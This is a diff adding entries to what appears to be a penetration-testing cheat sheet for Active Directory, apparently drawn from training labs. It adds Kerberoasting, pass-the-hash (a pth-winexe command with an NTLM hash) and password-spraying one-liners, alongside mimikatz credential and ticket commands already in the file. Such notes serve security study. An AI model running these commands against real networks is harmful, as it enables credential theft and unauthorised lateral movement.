@@ -170,6 +170,10 @@ Foreach($obj in $Result)
     }
 }
 ```  
+Enumerate all spn and get a service ticket in a format for john or hashcat.  
+
+`Invoke-Kerberoast.ps1`  
+
 
 
 
@@ -195,6 +199,13 @@ Using extracted hashes for pass the hash.
 
     mimikatz # token::revert
     mimikatz # sekurlsa::pth /user:elliot.alderson /domain:za.tryhackme.com /ntlm:654e4545455e5de /run:"some command"
+
+
+## Pass the hash  
+
+From pass-the-hash toolkit.  
+
+`pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd`  
 
 
 RDP PTH
@@ -253,4 +264,23 @@ Save ticket to disk.
 `kerberos::list /export`  
 
 
+ ## Kerberoasting  
+ 
+ Using a wordlist and service granting ticket to brute force and guess a password (kerberoasting).  
+ 
+ ```
+ sudo apt update && sudo apt install kerberoast
+ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
+ ```  
+ 
+ 
+## Password spraying  
+
+Eiter set to -Pass for single password or -File for a wordlist. -Admin is for admin accounts.  
+
+`.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin`  
+
+
+ 
+ 
  
